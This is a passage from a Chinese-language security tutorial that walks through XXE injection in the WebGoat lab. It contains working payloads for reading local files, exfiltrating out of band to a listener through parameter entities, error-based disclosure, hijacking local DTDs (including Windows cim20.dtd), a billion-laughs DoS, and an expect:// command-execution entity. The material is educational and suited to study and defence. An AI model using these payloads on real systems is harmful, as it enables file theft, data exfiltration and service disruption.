class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&e;">&amp;e;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span>&amp;<span class="token prolog">&lt;?xml version="1.0" ?></span><span class="token doctype">&lt;!DOCTYPE a [&lt;!ENTITY e PUBLIC "2" "file:///1.txt"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&e;">&amp;e;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>参数实体在dtd文件中或xml的dtd区中定义，定义格式为 <code>&lt;!ENTITY % 实体名称 "实体的值"&gt;</code>，引用格式使用%：<code>%实体名称</code>：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ENTITY % a SYSTEM "file:///1.txt"></span>%a;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE test [&lt;!ENTITY % aaa SYSTEM "http://127.0.0.1:8080/ext.dtd"></span>%aaa;]><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数实体的引用需要注意下面几点：<br>1.在参数实体中可以引用其他参数实体，但这种引用只能出现在外部DTD子集声明中；<br>2.参数实体可以定义新的实体；<br>3.参数实体解析优先级高于其他实体。<br>为了理解参数实体的利用方式，在Webgoat中XXE例子中进行详细测试，如下位置，想通过param3引用data的值:</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE r [&lt;!ENTITY % data SYSTEM "file:///c://2.txt"></span>&lt;!ENTITY % param3 "http://127.0.0.1:8090/txt=%data;">%param3;]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送后出现了错误“参数实体引用 “%data;” 不能出现在 DTD 的内部子集中的标记内”：<br><img src="https://i.loli.net/2021/08/06/TCPgAf75lFbKJ24.png"><br>所以在外部DTD中用参数实体引用其他参数实体：<br><img src="https://i.loli.net/2021/08/06/vc1SYszAPWJHRq7.png"><br>这里发现%data并没有被替换成文件内容发送到http服务器上，这里注意到使用的是SYSTEM关键字，后面的会直接被当成外部的链接了。所以这里既要把读取文件内容的参数实体解析进去又要对外发起请求，就需要有两次实体的引用，一次是将文件内容解析到字符串中，一次是引用外部实体时将数据带出，参数实体很好的具备了这些特性，可以从字符串中定义新的实体，并在dtd中进行引用完成多次的内容替换，所以构造外部dtd文件为：</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % p "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> exfil SYSTEM 'http://127.0.0.1:8090/?id=%data;'>"> %p;%exfil;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>%p;</code> 解析中 <code>&amp;#x25;</code> 解析为%，<code>%data</code>解析为文件内容 ，内部表现为如下xml，这样再次解析exfil等于一个外部实体引用就可以发起外部DTD的请求了：</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % exfil SYSTEM 'http://127.0.0.1:8090/?id=文件内容'> %exfil;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果这里使用普通实体来定义新的实体，会直接因为字符 <code>&lt;</code>  抛出异常<code>元素内容必须由格式正确的字符数据或标记组成。</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ee697d143246710d19437603ec30dcaa.png"><br>所以需要用参数实体来定义新的外部实体。POC发起后，成功在web监听上获取到了文件内容：<br><img src="https://i.loli.net/2021/08/06/ohklO9aS31JQvXG.png"><br>这里注意到响应中抛出了Unicode编码的异常:</p><pre class="line-numbers language-tex"><code class="language-tex">\u6587\u6863\u7C7B\u578B\u58F0\u660E\u5305\u542B\u6216\u6307\u5411\u7684\u6807\u8BB0\u58F0\u660E\u5FC5\u987B\u683C\u5F0F\u6B63\u786E\u3002 转换过来就是：文档类型声明包含或指向的标记声明必须格式正确。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>是因为引用外部的实体不是正确的dtd格式，将服务器返回一个正常的dtd格式，那么就正常了,POC:：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY % data SYSTEM "file:///c://2.txt"></span>&lt;!ENTITY % param3 SYSTEM "http://127.0.0.1:8090/note.dtd">%param3;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span>777<span class="token entity" title="&text;">&amp;text;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>note.dtd:</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % p "&lt;!ENTITY % send SYSTEM 'http://127.0.0.1:8090/2.dtd?text=%data;'>"> %p;%send;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.dtd：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">text</span> <span class="token attr-name">"Hi!!"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/06/BcnVLmdYQWx1pKz.png"><br>理解了参数实体部分，后续构造XXE Payload就比较容易了。</p><h3 id="XXE类型"><a href="#XXE类型" class="headerlink" title="XXE类型"></a>XXE类型</h3><p>一般来说，可以分为以下类型的 XXE 攻击：<br>XXE回显注入(Classic XXE)        — 一般的XXE,响应直接或间接返回资源内容<br>XXE盲注(Bind XXE) — 响应中不显示输出或错误<br>XXE报错注入(Error XXE) — 资源的内容在错误信息中返回<br>XXE DOS — 利用多重实体嵌套解析消耗服务器内存</p><p>在Webgoat中对几种注入进行测试。</p><h4 id="XXE回显注入"><a href="#XXE回显注入" class="headerlink" title="XXE回显注入"></a>XXE回显注入</h4><p>先传入正常值可在评论列表获得回显信息:<br><img src="https://i.loli.net/2021/08/05/crvYTpLPI1uKA7h.png"><br>测试实体引用，使用DTD定义实体，发送数据后，观察到内容在评论出回显，说明可以引用实体：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE a [&lt;!ENTITY b "666666666666666666666666666666666666666666666666666666666666666666"></span>]> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8cd3b4817c903cd19ad1c796df11db22.png"><br>再测试外部实体的引用，尝试使用HTTP协议引用外部DTD文件:</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE a SYSTEM "http://127.0.0.1:8090/note.dtd"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>外部dtd为note.dtd,内容如下，定义了一个普通实体b，值为 this is dtd:</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"this</span> <span class="token attr-name">is</span> <span class="token attr-name">dtd"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>观察到评论区回显了远程DTD文件中定义的实体值：<br><img src="https://i.loli.net/2021/08/05/vsgxY1NbPHZwoS3.png"><br>修改POC，测试使用参数实体引用外部DTD:</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE a [&lt;!ENTITY % x SYSTEM "http://127.0.0.1:8090/note.dtd"></span>%x;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&p;">&amp;p;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>外部DTD中参数实体data获取C:\2.txt文件内容，实体p定义为 <code>%data;</code> 的值：</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % data SYSTEM "file:///c://2.txt"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">p</span> <span class="token attr-name">"%data;"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过评论区的回显内容可以看到，成功读取到了C:\2.txt的文件内容。<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8216a4fbd64dc4440bf4bbcb699311ef.png"></p><h4 id="XXE盲注"><a href="#XXE盲注" class="headerlink" title="XXE盲注"></a>XXE盲注</h4><p>有时候没有办法获得回显信息(这里的测试环境会回显错误信息，假装看不见)，可以尝试利用带外数据(Out of Band, OOB)进行利用(或者利用一些延时、错误状态码等判断)，也就是盲XXE的利用，继续修改上一步的payload，首先发起的XML载荷中定义了两个参数实体，data 值是文件C:\2.txt的内容，param3 值的内容是远程文件note.dtd，然后引用参数实体param3：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE root [    &lt;!ENTITY % data SYSTEM "file:///c:/2.txt"></span>    &lt;!ENTITY % param3 SYSTEM "http://127.0.0.1:8090/note.dtd">    %param3;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&text;">&amp;text;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>引用后会先到 <a href="http://127.0.0.1:8090/note.dtd">http://127.0.0.1:8090/note.dtd</a> 加载note.dtd，在参数实体的理解中已经知道解析的过程了，引用p后定义send、解析data的值，然后引用send，带着text的值发起远程dtd请求，将数据带出：</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % p "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> send SYSTEM 'http://127.0.0.1:8090/2.dtd?text=%data;'>"> %p;%send;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发送POC后，成功获取到带外数据：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/034526faa3470a0d2171a588f59cadea.png"><br>上面是利用参数实体获取文件内容后，请求外部实体时将数据参数发送到服务器。但是如果文件内容存在多行时，会出现错误<code>ParseError at xx Message: Illegal character in URL</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/00072e3176412e10667471f6ed1a0c23.png"><br>参考了一些文章<a href="https://landgrey.me/blog/9/">Java xxe oob 读取多行文件失败的原因</a>，发现是在JDK中做了限制，数据带外在文件中存在一些如<code>%，&amp;</code>等特殊字符时也会抛出异常，一些协议(gopher)也在高版本中无法使用。所以说XXE能否深入利用还得看JDK的版本。在测试该类型XXE时，可以使用服务工具<a href="https://github.com/TheTwitchy/xxer">XXER</a>，可以开启HTTP和FTP服务获取带外数据：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2a333431c3588ae423f9988970e2c358.png"></p><h4 id="XXE报错注入"><a href="#XXE报错注入" class="headerlink" title="XXE报错注入"></a>XXE报错注入</h4><p>利用XML解析过程中访问不到远程DTD文件返回404造成报错，错误信息中将包含文件内容:</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE r [&lt;!ENTITY % data3 SYSTEM "file:///c://2.txt"></span>&lt;!ENTITY % sp SYSTEM "http://127.0.0.1:8090/note.dtd">%sp;%param3;%exfil;]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>web服务器上8090端口托管的note.dtd:</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % param3 "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> exfil SYSTEM 'http://127.0.0.1:8090/txt=%data3;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到一边用带外收到了文件内容，一边也在错误信息中回显了，这里的报错是因为加载远程的dtd文件后xml进行解析，我们要读取的文件不符号dtd的格式要求，就抛出了错误：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e5d84ad4a653b1be54531ceb0a43e0c6.png"><br>一般的都可以使用找不到文件的错误来进行回显：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/49180cc60c3717718fde88bc968f58e8.png"><br>用协议不存在报错读取多行包含<code>:</code>的文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/096aa525d9a94d7a11b1dca3032318f5.png"></p><p><em>本地DTD利用</em><br>在某些情况下，漏洞点支持XML外部实体但是不直接回显数据，在这种情况下选择数据带外和报错回显的方式来利用，但是如果目标系统存在防火墙限制就不能使用数据带外，在报错注入中用到的外部DTD是这样的:</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % param3 "&lt;!ENTITY % exfil SYSTEM 'http://127.0.0.1:8090/txt=%data3;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在参数实体类型中，不能在DOCTYPE中用实体中包含一个实体，会抛出异常<code>参数实体引用 xxx, 不能出现在 DTD 的内部子集中的标记内</code>。这时可以通过加载一些本地DTD，通过重定义本地DTD中的实体值进行利用。主要原理是XML在使用实体时，如果两个实体名称相同，则仅使用第一个实体。这样就可以在XML内部对实体进行重新定义然后利用本地DTD来进行参数实体解析，例如在服务器本地存在如下FIle0.dtd文件:</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">condition</span> <span class="token attr-name">"and</span> <span class="token attr-name">|</span> <span class="token attr-name">or</span> <span class="token attr-name">|</span> <span class="token attr-name">not</span> <span class="token attr-name">|</span> <span class="token attr-name">equal</span> <span class="token attr-name">|</span> <span class="token attr-name">contains</span> <span class="token attr-name">|</span> <span class="token attr-name">exists</span> <span class="token attr-name">|</span> <span class="token attr-name">subdomain-of"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">pattern</span> <span class="token attr-name">(%condition;)</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>FIle0.dtd文件中有一个condition参数实体，然后在下面ELEMENT标签中对参数实体进行引用定义为pattern的元素。 那么在poc中利用如下，引用FIle0.dtd文件后，重定义参数实体condition ：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY % x SYSTEM "file:///C:\\FIle0.dtd"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">condition</span> <span class="token attr-name">'aaa)</span><span class="token punctuation">></span></span>       &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> file SYSTEM "file:///C:/2.txt">       &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> eval "&lt;!ENTITY <span class="token entity" title="&#x26;">&amp;#x26;</span>#x25; error SYSTEM <span class="token entity" title="&#x27;">&amp;#x27;</span>file:///21.txt/<span class="token entity" title="&#x25;">&amp;#x25;</span>file;<span class="token entity" title="&#x27;">&amp;#x27;</span>>">       <span class="token entity" title="&#x25;">&amp;#x25;</span>eval;       <span class="token entity" title="&#x25;">&amp;#x25;</span>error;       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">aa(bb'</span><span class="token punctuation">></span></span>%x;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送POC后成功通过报错回显获得文件内容：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/71d6e54319b4502aabf0fccc9770f2d0.png"><br>分析POC，其中定义了condition，在%x解析后，File0.dtd的内容其实是在新定义的condition顺序之后，condition会被劫持为我们定义的内容，如下测试可以看到先定义的效果：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE a [&lt;!ENTITY b "aaaaaaaaa"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"bbbbbbbbb"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"ccccccccc"</span><span class="token punctuation">></span></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/ee0a5b720dcfb6e65a98282c0436d722.png"><br>我们知道实体就是参数值的引用，就等于把condition的内容放到dtd中，引入时会自动解析一次编码，所以在FIle0.dtd被解析后的XML内部的结果如下:</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!-- &lt;!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of">  --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">pattern</span> <span class="token attr-name">(</span> <span class="token attr-name">aaa)</span><span class="token punctuation">></span></span>&lt;!ENTITY % file SYSTEM "file:///C:/2.txt">&lt;!ENTITY % eval "&lt;!ENTITY % error SYSTEM 'file:///21.txt/%file;'>"> %eval; %error;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">aa(bb)</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样一来先用 <code>aaa)&gt;</code>闭合之前的标签，然后再引入新的参数实体，最后使用<code>&lt;!ENTITY aa(bb</code>闭合末尾标签，结合起来就跟使用外部实体一样的了，在xml中的定义是一个字符串，符号实体编码会在引用时自动解码，所以单引号转为了<code>&amp;#x27;</code>；百分号转为了<code>&amp;#x26;#x25;</code>，解码一次后还原为<code>&amp;#x25;</code>，再次引用时就还原到参数实体的<code>%</code>了 。</p><p>如何查找这些可利用的本地DTD?在<a href="https://github.com/GoSecure/dtd-finder/releases/download/1.1/dtd-finder-1.1-all.jar">github</a>上有一个可利用的工具，使用<code>java -jar dtd-finder-1.1-all.jar xxx.jar</code>，这里找了一个jboss的安装包进行扫描，存在一个可利用的dtd：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a9a6529ca3ee485264b707ebab29cd85.png"><br>POC中加上jar协议读取压缩文件，直接在错误中获得文件内容回显:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e6a6654f51a2bfb619625872f492667f.png"></p><p>windows中默认存在一个可利用的dtd<code>C:\Windows\System32\wbem\xml\cim20.dtd</code>：</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">SuperClass</span> <span class="token attr-name">'</span><span class="token punctuation">></span></span>Your DTD code<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">test</span> <span class="token attr-name">"test"'</span><span class="token punctuation">></span></span>%local_dtd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当然了，将这个<code>C:\Windows\System32\wbem\xml</code>打包成zip，使用工具扫描一波：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/7acd2861395e2d3a100e2a52e5c995e6.png"><br>直接利用：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/04272bda476d76d7dc71418119586f76.png"></p><h4 id="XXE-DOS"><a href="#XXE-DOS" class="headerlink" title="XXE DOS"></a>XXE DOS</h4><p>一个多重实体嵌套的例子：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE lolz [ &lt;!ENTITY lol "lol"></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">lolz</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol1</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>XXE的拒绝服务攻击在高版本JDK中进行了缓解，JDK会检测实体嵌套：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/69bf1c6a1a2e6d4ed624bfb7af68ec17.png"></p><h3 id="XXE协议支持"><a href="#XXE协议支持" class="headerlink" title="XXE协议支持"></a>XXE协议支持</h3><p>使用网上的一张图来描述：<br><img src="https://i.loli.net/2021/08/09/LhWV7beiMR8cpOq.png"><br>PHP中如果开启了expect支持可以进行RCE：</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY rce SYSTEM "expect://ifconfig"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>JAVA中因为JDK版本原因，gopher在JDK8移除、netdoc(netdoc:///tmp)在JDK9中移除。jar协议的使用方法：</p><pre class="line-numbers language-html"><code class="language-html">local => jar:file:///var/myarchive.zip!/file.txtremote => jar:https://download.host.com/myarchive.zip!/file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>用jar协议外带数据：<br><img src="https://i.loli.net/2021/08/09/qUa7jxLB5AvMX4V.png"><br>利用jar协议下载临时文件：<br><img src="https://i.loli.net/2021/08/16/V2xt4RdsBUQAEie.png"><br>利用zip中不存在的文件引发报错，抛出临时文件路径(一般默认是用户temp下<code>C:\Users\&lt;user&gt;\AppData\Local\Temp</code>,Linux默认在容器temp)：<br><img src="https://i.loli.net/2021/08/16/bnmlHqNKrLFJ35y.png"><br>这是一个用来在传输中进行延时的脚本,通过<code>python x.py x.zip</code>使用(x.zip末尾添加00垃圾字符):</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sys 